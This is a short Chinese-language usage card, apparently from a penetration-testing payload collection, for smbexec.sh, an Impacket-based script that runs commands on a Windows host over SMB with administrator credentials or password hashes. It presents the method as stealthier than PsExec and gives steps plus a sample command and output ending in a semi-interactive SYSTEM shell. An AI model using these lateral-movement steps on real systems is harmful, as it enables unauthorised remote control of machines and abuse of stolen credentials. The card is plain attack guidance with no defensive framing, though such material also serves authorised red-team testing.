## 📦 载荷使用说明：smbexec.sh

### 📝 功能说明
Impacket 工具集中的一种隐蔽的远程命令执行方式。与 PsExec 不同，它不上传服务可执行文件，而是直接将命令封装在批处理脚本中通过 SMB 协议执行，隐蔽性更强。

### ⚙️ 参数说明
```text
- `domain/username:password@target_ip`：具有管理员权限的凭据和目标 IP
- `-hashes`：支持使用 Hash 替代明文密码
```

### 🚀 操作步骤
1. 确认目标主机开放了 445 端口（SMB），且凭据具有管理员权限。
2. 修改脚本中的目标信息和凭据。
3. 执行脚本：`bash smbexec.sh`。
4. 获得一个半交互式的 SYSTEM 权限 Shell。

### 💻 执行样例
```bash
# 连接到 192.168.1.10
./smbexec.sh contoso.com/administrator:Admin@123@192.168.1.10

# 预期输出：
# [*] Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
# [!] Launching semi-interactive shell - Careful what you execute
# C:\Windows\system32> whoami
# nt authority\system
```
